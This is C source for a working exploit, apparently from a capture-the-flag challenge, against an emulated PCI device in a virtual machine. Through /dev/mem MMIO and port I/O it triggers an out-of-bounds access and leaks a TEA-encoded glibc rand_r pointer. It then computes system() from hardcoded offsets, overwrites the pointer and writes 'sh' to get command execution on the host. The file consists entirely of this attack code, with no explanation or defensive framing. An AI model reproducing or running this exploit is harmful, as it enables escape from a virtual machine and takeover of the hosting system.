#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
 
#define libc_system_offset 0x55410
#define libc_rand_r_offset 0x4aeb0
 
const uint32_t mmio_phy_base = 0xfebf1000;
const uint32_t mmio_mem_size = 0x800;
const uint32_t pmio_phy_base = 0xc040;
 
const char sys_mem_file[] = "/dev/mem";
 
uint64_t mmio_mem = 0x0;
 
int die(const char *err_info){
    printf("[-] Exit with: %s\n.", err_info);
    exit(-1);
}
 
void *mmap_file(const char *filename, uint32_t size, uint32_t offset){
    int fd = open(filename, O_RDWR|O_SYNC);
    if(fd<0){
        printf("[-] Can not open file: '%s'.\n", filename);
        die("OPEN ERROR!");
    }
    void *ptr = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
    if(ptr==MAP_FAILED){
        printf("[-] Can not mmap file: '*%s'.\n", filename);
        die("MMAP ERROR!");
    }
    close(fd);
    return ptr;
}
 
//mmio op
void mmio_write(uint64_t addr, uint64_t val){
    *(uint64_t *)(mmio_mem+addr) = val;
}
 
uint64_t mmio_read(uint64_t addr){
    return *(uint64_t *)(mmio_mem+addr);
}
 
//pmio op
void pmio_write(uint32_t addr, uint32_t val){
    outl(val, pmio_phy_base+addr);
}
 
uint32_t pmio_read(uint32_t addr){
    return inl(pmio_phy_base+addr);
}
 
void decode(uint32_t v[2]){
    uint32_t i = 0;
    do{
        i -= 0x61C88647;
        v[0] += ((v[1]<<4))^(v[1]+i)^((v[1]>>5));
        v[1] += ((v[0]<<4))^(v[0]+i)^((v[0]>>5));
    } while(i!=0xC6EF3720);
}
 
void encode(uint32_t v[2]){
    uint32_t i = 0xC6EF3720;
    do{
        v[1] -= ((v[0]<<4))^(v[0]+i)^((v[0]>>5));
        v[0] -= ((v[1]<<4))^(v[1]+i)^((v[1]>>5));
        i += 0x61C88647;
    } while(i);
}
 
int main(){
    mmio_mem = (uint64_t)mmap_file(sys_mem_file, mmio_mem_size, mmio_phy_base);
    printf("[+] Mmap mmio physical memory to [%p-%p].\n", (void *)mmio_mem, (void *)(mmio_mem+mmio_mem_size));
    if(iopl(3)) die("PMIO PERMISSION ERROR!");
 
    pmio_write(0, 1);        // memory_mode = 1
    pmio_write(4, 0);        // key[0-3] = 0
    pmio_write(8, 0x100);    // seek = 0x100
    printf("[*] Set block seek: %#x.\n", pmio_read(8));
 
    uint64_t glibc_randr = mmio_read(24);
    decode(&glibc_randr);
    printf("[*] rand_r@glibc %#lx.\n", glibc_randr);
    uint64_t glibc_system = glibc_randr-libc_rand_r_offset+libc_system_offset;
    printf("[+] system@glibc: %#lx.\n", glibc_system);
 
    encode(&glibc_system);
    printf("[*] Overwrite rand_r ptr.\n");
    mmio_write(24, glibc_system);
 
    pmio_write(28, 0x6873);    // "sh"
    return 0;
}